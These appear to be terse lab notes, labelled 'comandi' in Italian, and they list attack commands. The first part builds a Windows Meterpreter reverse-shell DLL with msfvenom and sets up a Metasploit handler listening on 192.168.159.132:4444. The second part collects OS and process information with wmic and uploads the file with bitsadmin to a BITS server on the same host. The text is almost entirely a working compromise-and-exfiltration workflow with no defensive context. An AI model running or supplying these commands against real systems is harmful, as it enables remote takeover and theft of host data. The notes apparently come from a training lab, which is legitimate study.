comandi:
#1 
1. sudo python3 -m http.server 80
2. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.159.132 LPORT=4444 -f dll -o payload.dll
3. msfconsole
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.159.132
LHOST => 192.168.159.132
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > exploit

#3
 python3 SimpleBITSServer.py 4231
 (echo OS INFORMATION: & wmic os get Caption, Version, BuildNumber, InstallDate /format:csv & echo. & echo PROCESS LIST: & wmic process get Name, ProcessId, ParentProcessId, ExecutablePath /format:csv) | find /v "" > system_info.txt
bitsadmin /transfer test /priority HIGH /upload http://192.168.159.132:4231/system_info.txt C:\Users\unina\Desktop\system_info.txt
